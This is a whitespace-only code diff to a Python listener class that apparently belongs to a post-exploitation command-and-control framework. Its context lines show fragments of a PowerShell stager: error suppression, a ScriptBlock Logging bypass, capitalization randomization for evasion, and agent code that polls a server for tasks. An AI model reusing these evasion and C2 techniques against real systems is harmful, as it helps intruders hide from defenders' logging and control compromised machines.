@@ -190,9 +190,9 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-		stager = '$ErrorActionPreference = \"SilentlyContinue\";'
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
-		    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
                     stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
@@ -399,7 +399,7 @@ class Listener:
                     $script:GetTask = {
                         try {
                                 # keep checking to see if there is response
-				#write-host "requesting task";
+                                #write-host "requesting task";
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
@@ -628,7 +628,7 @@ class Listener:
             certPath = listenerOptions['CertPath']['Value']
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
-		certPath = os.path.abspath(certPath)
+                certPath = os.path.abspath(certPath)
                 pyversion = sys.version_info
 
                 # support any version of tls
